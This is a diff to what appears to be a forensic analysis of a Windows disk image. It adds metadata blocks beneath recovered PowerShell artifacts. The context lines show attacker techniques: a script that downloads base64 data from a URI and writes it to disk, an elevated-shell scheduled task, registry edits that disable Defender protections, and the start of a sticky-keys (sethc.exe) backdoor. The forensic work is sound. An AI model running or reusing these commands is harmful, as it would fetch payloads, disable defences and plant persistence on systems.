@@ -23,6 +23,7 @@ if (Test-Path -Path $path) {
 $data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$Uri" -UseBasicParsing).content)
 [System.IO.File]::WriteAllBytes($path, $data)
 ```
+```text
 ### Metadata
 Name: /img_disk.raw/vol_vol7/Users/Alan/AppData/Local/Temp/WriteRemoteEncoded.ps1
 Type: File System
@@ -39,7 +40,7 @@ SHA-256:
 87cf6ffd1403914f6f8969c6f6fd730684c91670501f51b54200aabdb34ccf49
 Hash Lookup Results: UNKNOWN
 Internal ID: 14926
-
+```
 ## `WinRM_Elevated_Shell.ps1`
 ```powershell
 <?xml version="1.0" encoding="UTF-16"?>
@@ -81,6 +82,23 @@ Internal ID: 14926
     </Exec>
   </Actions>
 </Task>
+```
+```text
+Metadata
+Name: /img_disk.raw/vol_vol7/Windows/System32/Tasks/WinRM_Elevated_Shell
+Type: File System
+MIME Type: application/xml
+Size: 3152
+File Name Allocation: Allocated
+Metadata Allocation: Allocated
+Modified: 2019-08-17 05:36:40 UTC
+Accessed: 2019-08-17 05:36:40 UTC
+Created: 2019-08-17 05:36:28 UTC
+Changed: 2019-08-17 05:36:40 UTC
+MD5: b45f19d51fccd51316bbbc3a82c0d270
+SHA-256: 90857bb771e15c4f9eeb8dbea730d753650a859fce105f0239410876a56029a0
+Hash Lookup Results: UNKNOWN
+Internal ID: 188084
 ```
 
 ## `vagrant-shell.ps1`
@@ -129,7 +147,23 @@ New-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -PropertyType DWo
 New-ItemProperty -Path $path -Name "DisableOnAccessProtection" -PropertyType DWord -Value 1 -Force
 New-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -PropertyType DWord -Value 1 -Force
 ```
-
+```text
+Metadata
+Name: /img_disk.raw/vol_vol7/tmp/vagrant-shell.ps1
+Type: File System
+MIME Type: text/plain
+Size: 1933
+File Name Allocation: Allocated
+Metadata Allocation: Allocated
+Modified: 2019-08-17 05:36:39 UTC
+Accessed: 2019-08-17 05:36:40 UTC
+Created: 2019-08-17 05:36:26 UTC
+Changed: 2019-08-17 05:36:39 UTC
+MD5: e98a5bf691b4b2540f5a429d41a95329
+SHA-256: f2624fdf03f7526e78a14f40e9e50b62a36d1f143b065dd0c07bf2f0447a73a6
+Hash Lookup Results: UNKNOWN
+Internal ID: 46062
+```
 ## `Sticky.ps1`
 ```powershell
 $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
